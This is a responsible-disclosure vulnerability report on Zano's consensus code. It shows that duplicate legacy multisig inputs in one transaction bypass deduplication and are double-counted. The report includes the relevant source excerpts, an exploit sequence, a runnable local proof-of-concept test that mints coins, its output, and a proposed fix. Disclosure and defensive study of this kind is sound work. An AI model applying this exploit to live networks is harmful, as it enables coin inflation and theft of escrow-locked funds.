# Missing intra-transaction uniqueness check on legacy `txin_multisig` inputs leads to consensus-level coin inflation and theft of multisig/escrow-locked funds

A single Zano transaction can reference the **same legacy multisig output (`multisig_out_id`) more than once** among its inputs. The only intra-transaction input-reuse guard is the key-image de-duplication set, and `txin_multisig` inputs carry no key image, so they are silently excluded from it. No other check on the block-inclusion path rejects duplicate multisig inputs, while `check_tx_balance` adds the source output's `amount` once **per duplicate input**. One signature set validates all duplicates (in normal mode every input signs over the same prefix hash). An attacker who can satisfy the signature threshold of a single multisig output worth `A` can therefore build one transaction that references it `K` times, pass full consensus validation, and mint `(K−1)·A` out of thin air — or pay it to an address of their choice.

---

## Brief/Intro

Zano's consensus layer enforces input non-reuse within a single transaction only through a key-image de-duplication set, but legacy `txin_multisig` inputs have no key image and are excluded from that set, and no compensating check enforces uniqueness of `multisig_out_id` within a transaction. Because the balance equation counts each input's `amount` independently, a transaction that lists the same multisig output `K` times is accepted by full consensus validation while its input value is counted `K` times. Exploited on mainnet, this is a direct, repeatable, and undetectable inflation of the coin supply and theft of any multisig- or escrow-locked value the attacker can sign for — value is created from nothing and the resulting outputs are indistinguishable from honest ones. Confirmed reproducing end-to-end against a full build of current master/release (v2.1.19.476, build 477).

---

## Vulnerability Details

A Zano transaction can carry several input variants: `txin_to_key`, `txin_zc_input`, `txin_htlc`, and `txin_multisig`. The only mechanism that prevents the *same input* from appearing twice inside one transaction is the key-image diff set.

**1. The intra-tx dedup only covers inputs that have a key image.**

`src/currency_core/tx_semantic_validation.cpp:22-35`
```cpp
bool check_tx_inputs_keyimages_diff(const transaction& tx)
{
  std::unordered_set<crypto::key_image> key_images;
  crypto::key_image ki{};
  for(const auto& in_v : tx.vin)
  {
    if (get_key_image_from_txin_v(in_v, ki))   // only inputs that HAVE a key image are deduped
    {
      if (!key_images.insert(ki).second)
        return false;
    }
  }
  return true;
}
```

**2. `txin_multisig` has no key image, so it is never inserted into the dedup set.**

`src/currency_core/currency_format_utils_abstract.h:198-227`
```cpp
inline bool get_key_image_from_txin_v(const txin_v& in_v, crypto::key_image& result) noexcept
{
  try {
    if (in_v.type() == typeid(txin_zc_input)) { result = boost::get<txin_zc_input>(in_v).k_image; return true; }
    if (in_v.type() == typeid(txin_to_key))   { result = boost::get<txin_to_key>(in_v).k_image; return true; }
    if (in_v.type() == typeid(txin_htlc))      { result = boost::get<txin_htlc>(in_v).k_image; return true; }
  } catch (...) {}
  return false;                                // txin_multisig falls through: NOT deduped
}
```

**3. Input sorting accepts equal adjacent inputs.**

`validate_inputs_sorting` only rejects a strictly-decreasing pair, and the multisig comparator is a strict `<` on `multisig_out_id`, so two equal multisig inputs are "not less" and pass.

`src/currency_core/currency_format_utils_transactions.cpp:306-322`
```cpp
bool validate_inputs_sorting(const transaction& tx)
{
  if (get_tx_flags(tx) & TX_FLAG_SIGNATURE_MODE_SEPARATE)
    return true;
  size_t i = 0;
  for(; i+1 < tx.vin.size(); i++)
    if (less_txin_v(tx.vin[i+1], tx.vin[i]))   // only strict descending is rejected
      return false;
  return true;
}
```
`src/currency_core/currency_format_utils_abstract.h:318-321`
```cpp
inline bool compare_variant_by_types(const txin_multisig& left, const txin_multisig& right)
{
  return (left.multisig_out_id < right.multisig_out_id);   // equal => not-less => accepted
}
```

**4. Each multisig input is validated independently; there is no per-transaction `multisig_out_id` tracking, and the "already spent" check reads DB state that is only written at connect time.**

`src/currency_core/blockchain_storage.cpp:5742-5764` (`check_ms_input`, per-input only)
```cpp
LOC_CHK(txin.sigs_count == source_ms_out_target.minimum_sigs, "...");   // per-input
LOC_CHK(source_tx_out.amount == txin.amount, "amount missmatch");       // per-input
// ... no set of seen multisig_out_ids ...
```
`src/currency_core/blockchain_storage.cpp:5846-5854` (`check_tx_input`, spent flag read from DB)
```cpp
auto multisig_ptr = m_db_multisig_outs.find(txin.multisig_out_id);
// ...
LOC_CHK(multisig_ptr->spent_height == 0, "ms output is already spent ...");  // DB state, written at connect
```
During validation of the single malicious transaction, both duplicate inputs look up the same `multisig_out_id` and both see `spent_height == 0`, because the spend flag is only mutated when the block is connected.

**5. One signature set validates all duplicate inputs.** In normal mode (`flags == 0`, not `TX_FLAG_SIGNATURE_MODE_SEPARATE`), the per-input signing hash is just the transaction prefix hash for **every** input index.

`src/currency_core/currency_format_utils.cpp:4420-4424`
```cpp
crypto::hash prepare_prefix_hash_for_sign(const transaction& tx, uint64_t in_index, const crypto::hash& tx_id)
{
  CHECK_AND_ASSERT_MES(tx.vin.size() > in_index, null_hash, "...");
  crypto::hash tx_hash_for_signature = tx_id;
  if (get_tx_flags(tx) & TX_FLAG_SIGNATURE_MODE_SEPARATE)
  { /* ... per-input cropping only in SEPARATE mode ... */ }
  // normal mode returns tx_id for every input
```
Both duplicate inputs reference the same source output (hence the same `keys`) and are checked against the same hash, so a copied signature set validates both (`check_ms_input` loop, `blockchain_storage.cpp:5798-5820`).

**6. The balance equation double-counts the amount — once per duplicate input.**

Post-HF4 path — `src/currency_core/currency_format_utils.cpp:654-655`:
```cpp
VARIANT_CASE_CONST(txin_multisig, ms);
  bare_inputs_sum += ms.amount;     // added once PER txin_multisig => K*A for K duplicates
```
The post-HF4 zk balance proof is built **on top of** this plaintext `bare_inputs_sum` (`currency_format_utils.cpp:709`), so it only proves `inputs == outputs` and cannot detect the duplication — the attacker legitimately commits to `2A` of outputs.

Pre-HF4 path — `src/currency_core/currency_format_utils.cpp:3028-3037` (`get_inputs_money_amount`):
```cpp
for(const auto& in : tx.vin) {
  uint64_t this_amount = get_amount_from_variant(in);
  money += this_amount;             // sums every input, no dedup
}
```

**7. The balance check and input checks are on the live block-inclusion path.** `check_tx_balance` is invoked from `handle_block_to_main_chain` (`src/currency_core/blockchain_storage.cpp:7112`) and from the tx pool (`src/currency_core/tx_pool.cpp:242`); `check_tx_input` for multisig is invoked from `check_tx_inputs` (`blockchain_storage.cpp:5445`).

**8. At connect time, marking the output spent a second time does not abort — it only warns.**

`src/currency_core/blockchain_storage.cpp:3170-3186`
```cpp
bool blockchain_storage::update_spent_tx_flags_for_input(const crypto::hash& multisig_id, uint64_t spent_height)
{
  // ...
  if (msoe_local.spent_height != 0 && spent_height != 0)
    LOG_PRINT_YELLOW(... ": WARNING: ms out " << multisig_id << " was already marked as SPENT ...");
  msoe_local.spent_height = spent_height;   // overwrites and continues
  m_db_multisig_outs.set(multisig_id, msoe_local);
  return update_spent_tx_flags_for_input(ms_ptr->tx_id, ms_ptr->out_no, spent_height != 0);  // returns true
}
```

**Reachability.** Post-HF4, `is_allowed_after_hardfork4` (`blockchain_storage.cpp:6412-6431`) rejects only `tx_out_bare` *outputs* (which carry `txout_multisig`), so **new** multisig outputs cannot be created. However, `txin_multisig` **spends remain allowed** (the input loop never disallows them; `txin_multisig` is a supported input type at `currency_format_utils.cpp:3057`), and pre-HF4 multisig outputs remain indexed in `m_db_multisig_outs` and spendable. The double-count therefore reaches the modern `check_tx_balance`, and the bug is exploitable against any existing pre-HF4 multisig/escrow output, and without restriction in any era/fork where multisig outputs are creatable.

**Exploit sequence (normal mode, `flags == 0`):**
1. Obtain/control a multisig output of value `A` whose threshold you can sign (e.g., a 2-of-2 you fully control, or an escrow at release).
2. Build one transaction listing the same `txin_multisig` (same `multisig_out_id`, `amount`, `sigs_count`) `K` times; one signature set validates all `K` inputs.
3. Add an output worth `K·A − fee`. `check_tx_balance` permits it (`bare_inputs_sum = K·A`); the inputs are seen unspent; sorting accepts equal inputs.
4. At connect, the 2nd..Kth spend-marks only warn. Result: the `A`-valued output yields ~`K·A` spendable — `(K−1)·A` minted from nothing.

The same gap exists on the alternative-chain path: `validate_alt_block_ms_input` (`blockchain_storage.cpp:8439`) compares a multisig input only against *other transactions'* inputs, never against sibling inputs of the same transaction.

---

## Impact Details

- **Consensus-level coin inflation (supply-invariant break).** Each duplicate of an `A`-valued multisig input mints `A` (minus the flat fee). With `K` copies in one transaction the attacker realizes `(K−1)·A`; `K` is bounded only by the per-tx input limit (`CURRENCY_TX_MAX_ALLOWED_INPUTS`), so a single transaction can mint many multiples of any multisig output the attacker can spend. This is the most severe class for a currency — value is created from nothing and breaks the total-supply guarantee.
- **Theft of multisig-/escrow-locked funds.** Zano's marketplace escrow deposits sit in 2-of-2 `txout_multisig` outputs. Any party able to assemble the threshold once (e.g., at a legitimate escrow release that both parties co-sign) can instead submit a duplicated-input transaction that pays out `K×` the locked amount to an address they choose, with no pre-positioning.
- **Undetectable.** The minted outputs are ordinary outputs; nothing on-chain distinguishes the inflating transaction beyond the repeated `multisig_out_id`s, which no node rejects. The only artifact is a benign-looking YELLOW log line on the validator side at connect time.
- **No privileged role required.** The attacker only needs to satisfy the signature threshold of a multisig output they legitimately participate in — a normal-participant capability, not an admin/owner/governance action.
- **Blast radius on current mainnet.** Current Zano is post-HF4, where new multisig outputs cannot be created, so realized exploitation targets existing pre-HF4 multisig/escrow outputs the attacker can sign for. The realized amount = value held in spendable pre-HF4 multisig/escrow outputs (a census of those outputs sizes the loss). In any pre-HF4, regtest, or active CryptoNote-derived fork reusing this validation, exploitation is fully permissionless and self-contained.

---

## References

- Repository: https://github.com/hyle-team/zano
- Verified against: master/release HEAD `94bf25d8`, v2.1.19.476 (build 477)
- Missing dedup (key-image only): `src/currency_core/tx_semantic_validation.cpp:22-35` (`check_tx_inputs_keyimages_diff`)
- Multisig has no key image: `src/currency_core/currency_format_utils_abstract.h:198-227` (`get_key_image_from_txin_v`)
- Equal-inputs sorting accepted: `src/currency_core/currency_format_utils_transactions.cpp:306-322`, `src/currency_core/currency_format_utils_abstract.h:318-321`
- Per-input multisig validation (no intra-tx tracking): `src/currency_core/blockchain_storage.cpp:5742-5871` (`check_ms_input`, `check_tx_input`)
- Single per-input prefix hash (one sig set covers duplicates): `src/currency_core/currency_format_utils.cpp:4420-4424` (`prepare_prefix_hash_for_sign`)
- Amount double-count: `src/currency_core/currency_format_utils.cpp:654-655` (`check_tx_balance`, post-HF4), `:3028-3037` (`get_inputs_money_amount`, pre-HF4)
- Warn-only re-spend mark: `src/currency_core/blockchain_storage.cpp:3170-3186` (`update_spent_tx_flags_for_input`)
- Block-inclusion path: `src/currency_core/blockchain_storage.cpp:7063-7146` (`handle_block_to_main_chain`); pool path: `src/currency_core/tx_pool.cpp:242`
- Post-HF4 output restriction (reachability): `src/currency_core/blockchain_storage.cpp:6412-6431` (`is_allowed_after_hardfork4`)
- Alt-chain gap: `src/currency_core/blockchain_storage.cpp:8439` (`validate_alt_block_ms_input`)

---

## Proof of Concept

A runnable `core_tests` (chaingen) PoC builds an inflating transaction that is validated by the **real consensus engine** (`handle_block_to_main_chain → check_tx_inputs / check_tx_balance / check_tx_inputs_keyimages_diff`), then asserts the inflation on a real `wallet2` balance. It runs entirely locally; **no transaction is broadcast to any network.** No `src/` consensus code is modified — the only non-test change is a 2-line delegating-constructor compile fix in the test harness (`tests/core_tests/block_validation.cpp`) needed to build under Apple clang, unrelated to the bug.

**Test (`tests/core_tests/multisig_same_tx_double_count.cpp`, exploit core):**
```cpp
// 1) create a 2-of-2 multisig output worth A = 5 COIN (attacker controls both owners alice+bob)
fill_tx_sources_and_destinations(events, blk_0r, miner_acc.get_keys(), ms_addr_list,
                                 A, TESTS_DEFAULT_FEE, 0, sources, destinations,
                                 true, true, /*minimum_sigs=*/2);
construct_tx(miner_acc.get_keys(), sources, destinations, empty_attachment, ms_tx, ...);
crypto::hash ms_id = get_multisig_out_id(ms_tx, ms_out_idx);
MAKE_NEXT_BLOCK_TX1(events, blk_1, blk_0r, miner_acc, ms_tx);   // exactly ONE A-valued ms output now exists

// 2) ONE spend tx with TWO IDENTICAL txin_multisig inputs (same ms_id), output = 2A - fee to bob
tx_source_entry se; se.amount = A; se.multisig_id = ms_id; se.ms_sigs_count = 2; /* ... */
std::vector<tx_source_entry> evil_sources({ se, se });
std::vector<tx_destination_entry> evil_dsts({ tx_destination_entry(2*A - TESTS_DEFAULT_FEE, bob_addr) });
construct_tx(miner_acc.get_keys(), evil_sources, evil_dsts, empty_attachment, evil_tx, ...);
// both inputs are txin_multisig referencing the SAME multisig_out_id:
assert(evil_tx.vin.size() == 2 &&
       boost::get<txin_multisig>(evil_tx.vin[0]).multisig_out_id ==
       boost::get<txin_multisig>(evil_tx.vin[1]).multisig_out_id);
// one signature set (alice+bob) validates BOTH inputs (flags==0 => same prefix hash):
sign_multisig_input_in_tx(evil_tx, 0, alice_keys, ms_tx, &f0); sign_multisig_input_in_tx(evil_tx, 0, bob_keys, ms_tx, &f0);
sign_multisig_input_in_tx(evil_tx, 1, alice_keys, ms_tx, &f1); sign_multisig_input_in_tx(evil_tx, 1, bob_keys, ms_tx, &f1);

// 3) submit in a block WITHOUT mark_invalid_tx => acceptance is asserted by the harness
MAKE_NEXT_BLOCK_TX1(events, blk_2, blk_1, miner_acc, evil_tx);

// 4) HARM ASSERTION: bob must hold ~2A-fee from a single A-valued multisig output
CHECK_AND_ASSERT_MES(bob_wlt->balance() >= 2*A - TESTS_DEFAULT_FEE, false, "no inflation");
```

**Build & run (local only):**
```bash
cd build/release
make -j10 coretests
./tests/coretests --run-single-test=gen_multisig_same_tx_double_count
```

**Result (reproduced, real consensus validation):**
```
#TEST# >>>> gen_multisig_same_tx_double_count <<<< start replaying events
[INFLATION-POC] single multisig output value A = 5.000000000000
[INFLATION-POC] bob balance after same-tx double-count spend = 9.990000000000
[INFLATION-POC] expected (2A - fee) if bug present = 9.990000000000
[INFLATION-POC] CONFIRMED: bob received 9.990000000000 from a single multisig output worth
                5.000000000000 -> ~4.990000000000 minted from nothing.
#TEST# >>>> gen_multisig_same_tx_double_count <<<< Succeeded
REPORT:  Total tests run: 1   Failures: 0
```

A single 5-COIN multisig output spent twice in one transaction was accepted by full consensus validation and credited the attacker-controlled wallet **9.99 COIN (2A − fee)** — **~5 COIN created from nothing.** The exact `2A − fee` figure (rather than an arbitrary amount) confirms the balance check is active but fed a double-counted input sum, isolating the defect to the missing multisig-input dedup.

---

## Recommended fix

Add an intra-transaction uniqueness constraint for multisig inputs, mirroring the key-image dedup:
```cpp
// tx_semantic_validation.cpp : check_tx_inputs_keyimages_diff (runs on the block-inclusion path)
std::unordered_set<crypto::hash> ms_ids;
for (const auto& in_v : tx.vin) {
  if (get_key_image_from_txin_v(in_v, ki)) {
    if (!key_images.insert(ki).second) return false;
  } else if (in_v.type() == typeid(txin_multisig)) {
    if (!ms_ids.insert(boost::get<txin_multisig>(in_v).multisig_out_id).second)
      return false; // reject duplicate multisig input within one tx
  }
}
```
Additionally: make `update_spent_tx_flags_for_input` **abort** (return false) when an output is already marked spent, and apply the duplicate-`multisig_out_id` rejection on the alt-chain path (`validate_alt_block_ms_input`). Gate behind a hardfork boundary as appropriate.

---

*Disclosure note: confirmed in a local regtest harness only; no transactions were broadcast. Intended for private, responsible disclosure to the Zano security team prior to any publication or embargo lift.*
